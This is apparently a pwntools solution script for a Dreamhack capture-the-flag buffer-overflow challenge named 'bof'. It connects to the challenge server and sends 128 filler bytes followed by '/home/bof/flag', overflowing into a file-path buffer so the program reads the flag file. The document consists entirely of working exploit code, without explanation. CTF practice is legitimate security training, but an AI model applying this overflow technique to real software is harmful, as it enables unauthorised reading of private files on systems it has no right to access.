#!/usr/bin/python3
from pwn import *

#p = process("./bof")
p = remote("host3.dreamhack.games", 12883)

payload = b'A'*128 + b'/home/bof/flag'

p.sendlineafter(b'meow? ', payload)

p.interactive()
